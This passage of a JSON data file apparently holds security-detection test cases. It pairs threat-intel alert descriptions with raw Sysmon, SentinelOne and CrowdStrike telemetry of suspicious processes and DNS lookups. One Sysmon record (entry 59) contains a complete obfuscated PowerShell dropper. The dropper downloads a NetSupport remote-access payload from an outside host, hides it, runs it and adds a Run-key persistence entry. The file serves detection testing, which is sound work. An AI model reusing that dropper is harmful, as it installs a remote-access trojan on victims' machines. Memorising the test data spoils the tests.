        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1735709472297,\"meta\":{\"traceId\":\"01GE20GAECTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17357094722915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1735709472297\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"powershell.exe -executionpolicy remotesigned -File Get-DataInfo.ps1 method\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17357094722975951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1735709472297\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "53": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activity4848.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\4848.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=DD879217D6270CE10527C1F4752E2602,SHA256=A406A3C1474A57C62F3DBD56AA15D5D732E6A0FE8BBFD7BCE9425B132204DA8B,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\4848.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"newrock.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4968\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2308,\"ProcessId\":\"10148\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379908,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":704,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-10-09 04:32:38.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "54": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1718325164\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1718339565\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "55": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityw7k5wgm3y.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\ProgramData\\\\Google Updater 2.0\\\\w7k5wgm3y.exe\\\" \",\"Company\":\"Softdiv Software Sdn Bhd\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\ProgramData\\\\Google Updater 2.0\\\\\",\"Description\":\"Softdiv MP3 to WAV Converter.exe\",\"EventID\":1,\"FileVersion\":\"0.3.2.0\",\"Hashes\":\"MD5=4265F75CBB4BA1BC23B07890ED42872B,SHA256=5A29583A80B7DC2CBCE4B8712024DCDFF9F777D908B6F16DFB3D59FAD991083E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\ProgramData\\\\Google Updater 2.0\\\\w7k5wgm3y.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-AA65-6384-F2E8-030000000000}\",\"LogonId\":\"0x3e8f2\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"fbab6880a695.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-AA65-6384-6B00-000000004300}\",\"ParentProcessId\":\"4920\",\"ProcessGuid\":\"{C784477D-2B80-638F-1006-000000004300}\",\"ProcessID\":2288,\"ProcessId\":\"3088\",\"Product\":\"Softdiv MP3 to WAV Converter 3.2\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":92362,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":688,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-01 05:33:29.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "56": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityQuickBooks.vbs launched by svchost.exe",
        "ini_data": [
            "{\"EventType\":\"\",\"AccountName\":\"\",\"Domain\":\"\",\"Message\":\"\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"EventID\":1,\"Version\":5,\"Level\":4,\"OpcodeValue\":0,\"Keywords\":9223372036854775808,\"EventTime\":1672667450,\"RecordNumber\":85943,\"ProcessID\":2302,\"ThreadID\":3068,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"serhatg.local\",\"Hostname\":\"serhatg.local\",\"UserID\":\"S-1-5-18\",\"RuleName\":\"-\",\"UtcTime\":\"2024-12-24 05:36:39.399\",\"ProcessGuid\":\"{C784477D-EC9D-625D-5206-000000003E00}\",\"ProcessId\":\"7128\",\"Image\":\"C:\\\\Users\\\\serhatg\\\\AppData\\\\Roaming\\\\VBS\\\\QuickBooks.vbs\",\"FileVersion\":\"10.0.17134.1098 (WinBuild.160101.0800)\",\"Description\":\"Host Process for Windows Tasks\",\"Product\":\"Microsoft\\\\xae Windows\\\\xae Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"QuickBooks.vbs\",\"CommandLine\":\"QuickBooks.vbs\",\"CurrentDirectory\":\"C:\\\\Users\\\\serhatg\\\\AppData\\\\Roaming\\\\VBS\\\\\",\"User\":\"serhatg.local\\\\serhatg\",\"LogonGuid\":\"{C784477D-5ED0-6255-30E3-030000000000}\",\"LogonId\":\"0x3e330\",\"TerminalSessionId\":\"1\",\"IntegrityLevel\":\"Medium\",\"Hashes\":\"MD5=D8889119B3B0EC07E548F01EDEFC475A,SHA256=76D8EEA528D58442D22D1B81882FF58286025203BC69115E8EC485984249BA67,IMPHASH=F66BB3B3040DB6FAC0F2A2BA91E541DC0F0C7319\",\"ParentProcessGuid\":\"{C784477D-5ECB-6255-1F00-000000003E00}\",\"ParentProcessId\":\"1340\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"ParentCommandLine\":\"c:\\\\windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\svchost.exe"
        ]
    },
    "57": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□%□□□□□□□□□□□□□□ □N2□Chronicle Internal□'□#sandra-fields-windows-pc.corp.local\"□*f\"d□□14281□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:14281"
        ]
    },
    "58": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1731807150\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1731821551\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "59": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by powershell.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -ExecutionPolicy Bypass -Command \\\"cd $env:AppData; $Z1P0r='R0k3r.zip'; $eXp4r0cH=Get-Command expand-archive -ErrorAction SilentlyContinue; $p4NteCh=$env:APPDATA+'\\\\'+$Z1P0r; $lI0n3k='https://a.ezydict.com/4th_2.zip'; $r1N4m='OfficeStartup'; $b1tS1iT=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue; $b1tSiRcDm = 'bitsadmin.exe /transfer MeDoW /download /priority normal '+$lI0n3k+' '+$p4NteCh; $peS1zP=$env:APPDATA+'\\\\'+$r1N4m; if ($eXp4r0cH) {if ($b1tS1iT) {Start-BitsTransfer -Source $lI0n3k -Destination $p4NteCh;} else {Invoke-Expression -Command $b1tSiRcDm}; expand-archive -path $p4NteCh -destinationpath $peS1zP; Remove-Item -path $p4NteCh;} else {$f1L1es=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', 'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL'); $lI0n3k2='http://YOUR.LINK/files/'; New-Item -Path $env:APPDATA -Name $r1N4m -ItemType 'directory'; if ($b1tS1iT) {$f1L1es | ForEach-Object {$s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; Start-BitsTransfer -Source $s10r13s -Destination $1dus1T; }; } else { $f1L1es | ForEach-Object { $s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; $b1tSiRcDm2='bitsadmin.exe /transfer MeDoW /download /priority normal '+$s10r13s+' '+$1dus1T; Invoke-Expression -Command $b1tSiRcDm2; }; }; }; $F1l1ed3=Get-Item $peS1zP -Force; $F1l1ed3.attributes='Hidden'; cd $peS1zP; start client32.exe; $F33Sr=$peS1zP+'\\\\client32.exe'; New-ItemProperty -Path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name $r1N4m -Value $F33Sr  -PropertyType 'String'; #g7Vc*-Jh7tZPfY0q6P5D5o15GdlrN#Y7-mQOJpX*i$pocw(-ErQELxY\\u0026de$r0xwndS-WV3PLGJ%5zWmLeyAPpYrP*#qgHDM=7UOXjaCfWx=8nWHx_sEFQE%tw1R)g7A\\u0026)mBA6nJeZiFOS=Zh#DbY^=WJyZDO2!XWKJGFqFa-$s*agin!r0kd#f!^RPu@mnF5NaBx6$fE$T\\u0026d6kyj3\\u0026vFok--dte8=1hK!QM-M$8m1C@n%OO%lq$1iaeWW5SX1aBcfkAi\\u0026UwPe_xOHnJiEct^1VBmC2EJy3uw_Zi5(eis^88NYX\\u00267n\\u0026mf%#iy0fVL\\u0026T_eRg-S8pE(0qg=MaIDD(Spzk37l7hMRe\\u0026Q@0twVYvUbE=hnofn@AA*Y(Sz$oK!J382C00v^yZSnMlyL6CVD!=T-s)*uFi%OxVSNzxSj_=%lOWdZm\\u0026HNCi$C+Ar9Ype=-RxmJsdwSEMjJ7@sT@A^vi4+jebdE\\u0026W_Uxbgc\\u0026j2G1KjeA!=\\u0026yH$B_bHLM+Bpn4hY6$pnFWXPCr4JrlKYo(Pra)eeS_L3d=sopqXgG^H+#j*l!zvex+%J#T8cZM\\u0026Y((gzD7HiCQJ(-9bRCrh6nV+c7eiQiQ_h6ywU0P3AUtnzlGdq6C$*GS$^(=7\\u0026$KnWWpsczhj@VG6(+frmeyyBNnQawJE-q(V3tEo=gkOq2b5hXIu9+AjgmHra@j07QroSPC2YC55!IQi@Y=t-eUJav@Wrd8M%oUXixYa0ftlsa@c6iWW(Q_vCl_)lDr\\u0026CzRHa^\\u0026qTFyM5CiXjkxQ6Pn6zNT_Cd6Cqv7F^ACC7qKAw7JPm^6K_Zp+wPr(V(l0k@qhe0HTdjB+lJYN*@ICyrrUAmA8DVa\\u0026c9xcq_+-T#zfYDP!d6!TOF%\\u0026R1eX%oMdi3a3_32Yq*njTDjsVs*PwD)L#e4)bV@dxM\\u0026%1BwbsZvdlYka=j+fe9*niSr1C(1(E!K!9!HBGfvAG%US=ipYlC\\u0026eA(4)lN3t^I3hMWVWPxMWlJSiCI3n5yTPYp$ni5pQMGH@-#\\u0026#^_k(d6UCVqtqpC!4^#TfS@8s\\u0026QA^cEZe!jXJR4_6uq3Y-lHr0D_hkxn9LMN$RY#ugP^B2kzoQU(cdqJ5Y+igS1fQ0h=87xG_j$XS)6J3r*((T6+!Fuq+L@@(81_dZyXPn3E9oEiZca9A0x7=@q1qyeN93JFFXP4lJk^8n1iABAm\\u0026PdofW\\u0026hXHfFC!kxz(PvTTNIuk6G^l6=OqnhXW_1hD_GYo\\u0026=RH\\u0026TpLTSj^VoPBPfSYFKxoPXNN@R31wLxUsMeyVieYz*rRUBFQTkp3Me8eC516O5^jvvdn3\\u0026D$$z17mWM=+1C+FjF\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentProcessGuid\":\"{C784477D-B0D6-648B-B80A-000000004A00}\",\"ParentProcessId\":\"6632\",\"ProcessGuid\":\"{C784477D-B0F2-648B-BA0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"2352\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749896,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-09-29 04:34:38.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    },
    "60": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□%□□□□□□□□□□□□□□ □N2□Chronicle Internal□#□□ana-moore-windows-pc.corp.local\"□*f\"d□□33253□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:33253"
        ]
    },
    "61": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityWindPlugin.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindPlugin.exe\\\" \",\"Company\":\"Softdiv Software Sdn Bhd\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\",\"Description\":\"Softdiv MP3 to WAV Converter.exe\",\"EventID\":1,\"FileVersion\":\"0.3.2.0\",\"Hashes\":\"MD5=4265F75CBB4BA1BC23B07890ED42872B,SHA256=5A29583A80B7DC2CBCE4B8712024DCDFF9F777D908B6F16DFB3D59FAD991083E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindPlugin.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-AA65-6384-F2E8-030000000000}\",\"LogonId\":\"0x3e8f2\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"fbab6880a695.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-AA65-6384-6B00-000000004300}\",\"ParentProcessId\":\"4920\",\"ProcessGuid\":\"{C784477D-2B5F-638F-0806-000000004300}\",\"ProcessID\":2288,\"ProcessId\":\"468\",\"Product\":\"Softdiv MP3 to WAV Converter 3.2\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":92342,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":688,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-01 05:33:19.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "62": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityWindPlugin.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindPlugin.exe\\\" \",\"Company\":\"Softdiv Software Sdn Bhd\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\",\"Description\":\"Softdiv MP3 to WAV Converter.exe\",\"EventID\":1,\"FileVersion\":\"0.3.2.0\",\"Hashes\":\"MD5=4265F75CBB4BA1BC23B07890ED42872B,SHA256=5A29583A80B7DC2CBCE4B8712024DCDFF9F777D908B6F16DFB3D59FAD991083E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindPlugin.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-AA65-6384-F2E8-030000000000}\",\"LogonId\":\"0x3e8f2\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"fbab6880a695.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-AA65-6384-6B00-000000004300}\",\"ParentProcessId\":\"4920\",\"ProcessGuid\":\"{C784477D-2B5F-638F-0806-000000004300}\",\"ProcessID\":2288,\"ProcessId\":\"468\",\"Product\":\"Softdiv MP3 to WAV Converter 3.2\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":92342,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":688,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-19 05:32:01.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "63": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityexecutable.exe launched by sandbox-control.exe",
        "ini_data": [
